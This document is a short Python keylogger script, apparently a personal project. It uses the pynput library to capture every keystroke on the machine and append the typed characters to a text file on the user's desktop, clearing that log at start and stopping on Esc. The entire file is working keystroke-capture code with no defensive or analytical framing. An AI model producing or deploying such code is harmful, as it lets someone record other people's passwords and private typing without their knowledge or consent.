# Library to keep track of the inputs
from pynput.keyboard import Key
from pynput.keyboard import Listener

import os

key_info = "key_info.txt"

file_path = "C:\\Users\\bardh\\OneDrive\\Desktop\\keylogger\\KeyLogger Project"     # Change dest file path before test
extension = "\\"

count = 0
keys_list = []

# Function to keep track whenever a key is press
def on_press(key):
    global count
    global keys_list

    print(key)
    keys_list.append(key)    # Adds the key to the list
    count += 1

    # Resets the list and writes to file
    if count >= 1:
        count = 0
        write_file(keys_list)
        keys_list = []

# Function that writes the keys to file
def write_file(keys):
    with open(file_path + extension + key_info, "a") as f:
        for key in keys_list:
            k = str(key).replace("'", "")
            if k.find("space") > 0:             # Checks if the input has a space
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

# Function to keep track whenever a key is release
def on_release(key):
    if key == Key.esc:
        return False

# Deletes the content in the text file
if os.path.exists("key_info.txt"):
    with open("key_info.txt", "r") as f:
        f = open("key_info.txt", "r+")
        f.seek(0)
        f.truncate()

# Listener function that combines all three functions into run
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
